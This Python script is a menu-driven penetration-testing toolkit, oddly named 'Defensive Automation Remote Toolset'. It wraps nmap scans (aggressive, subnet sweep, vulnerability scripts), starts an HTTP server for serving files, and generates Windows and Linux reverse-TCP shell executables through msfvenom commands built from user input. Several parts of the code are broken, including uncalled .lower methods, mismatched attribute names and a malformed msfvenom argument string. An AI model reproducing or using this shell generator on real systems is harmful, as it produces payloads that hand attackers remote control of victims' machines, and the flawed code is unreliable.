import os
import nmap 

class banner:
    def __init__(self,banner1,banner2,banner3):
        self.banner1 = banner1
        self.banner2 = banner2
        self.banner3  = banner3 
class ip_add:
    def __init__(self,rhost,lhost):
        self.rhost = rhost
        self.lhost = lhost
class menu:
    def __init__(self,main,nmap,):
        self.main = main
        self.nmap = nmap
class shell_stuff:
    def __init__(self,msfv):
        self.msfv = msfv


class shell_win: 
    def __init__(self,oper_sys,exe_elf,shell_name):
        self.oper_sys_win = oper_sys
        self.exe_elf_win = exe_elf
        self.shell_name_win = shell_name
class shell_linux: 
    def __init__(self,oper_sys,exe_elf,shell_name,xtype):
        self.oper_sys = oper_sys 
        self.exe_elf = exe_elf
        self.shell_name = shell_name 
        self.xtype = xtype 
class misc:
    def __init__(self,lhost):
        self.lhost = lhost 


menu.nmap = """ 
NMAP Menu 

[1] Simple Scan
[2] Aggresive Scan
[3] Subnet Sweep
[4] Vulunrability Scan
[5] IPV6               
                """

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

menu.main = """

[1] Nmap Interface 
[2] Start Python Http Server 
[3] Shell ceration 
[4]

"""
#// menu non complete 

banner.banner1 = "        Defensive Automation Remote Toolset"
banner.banner2 = "        https://github.com/Richycam"

banner.banner3 =""" 
                                _____  ___  ______ ______
                                |  _  \/ _ \ | ___ \_   _|
                                | | | / /_\ \| |_/ / | |  
                                | | | |  _  ||    /  | |  
                                | |/ /| | | || |\ \  | |  
                                |___/ \_| |_/\_| \_| \_/  
                          
                                                     
"""

def flow_handler():
    check_value = input  ("\n b to go back to main menu \n DAT> ")
    if check_value == "b":
        clear()


def win_shells():
    shell_win.oper_sys_win ="/windows/shell_reverse_tcp/"
    shell_win.exe_elf_win = "-f exe"
    shell_win.shell_name_win = "shell.exe"

def linux_shells():
    shell_linux.x_type = input("x86 or x64? \n DAT> ")
    shell_linux.oper_sys = "/linux/{0}/shell_reverse_tcp/".format(shell_linux.x_type)
    shell_linux.exe_elf = "-f elf"
    shell_linux.shell_name = "shell.elf"

def opt_1():
    clear()
    print(menu.nmap)
    ip_add.rhost = input("IP to scan = ").lower
    nmap_impt = input("DAT> ")
    match nmap_impt:
        case "1":
            clear()
            nmap.scan(ip_add.rhost)
        case "2":
            clear()
            nmap.PortScanner.command_line("nmap {0} -A".format(ip_add.rhost))
        case "3":
            clear()
            nmap.PortScanner.command_line("nmap {0} /24".format(ip_add.rhost))
        case "4":
            clear()
            nmap.PortScanner.command_line("nmap {0} --script=vuln".format(ip_add.rhost))
        case "5":
            nmap.PortScanner.command_line("nmap {0} -6".format(ip_add.rhost))
        case "b":
            clear()
        

def opt_2():
    srv_port = input("Port to use?")
    srv_start = "python3 -m http.server {0}".format(srv_port)
    print(" ctrl + c to shut down server")
    os.system(srv_start)
    clear()
    ("\n")


def opt_3():
    print("the shell should be created in your home directory \n ")
    check_1 = input("Windows or linux? \n DAT> ").lower
    match check_1:
        case "windows":
            win_shells()
        case "linux":
            linux_shells()
    
    misc.lhost = input("Lhost (Local Host) \n DAT> ")
    
    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(shell_win.oper_sys,misc.lhost,shell_win.exe_elf,shell_win.shell_name)
    alltogether_msf = ("msfvenom -p {0} {1} {2} > {3}").format(shell_linux.oper_sys,misc.lhost,shell_linux.exe_elf,shell_linux.shell_name)
    if check_1 == "windows":
        os.system(alltogether_msf_win)
    elif check_1 == "linux":
        os.system(alltogether_msf)
    flow_handler()
    clear()

def main():
    clear()
    cntrl_main = True
    while cntrl_main:
        clear()
        print(banner.banner3)
        print(banner.banner1)
        print(banner.banner2)
        print(menu.main)
        
        choose = input("DAT>")
        clear()
        
        match choose: 
            case "1":
                opt_1() #Nmap interface
                continue
            case "2":
                opt_2() #Python Server
                continue
            case "3":
                opt_3() #Shell creator
                continue
main()
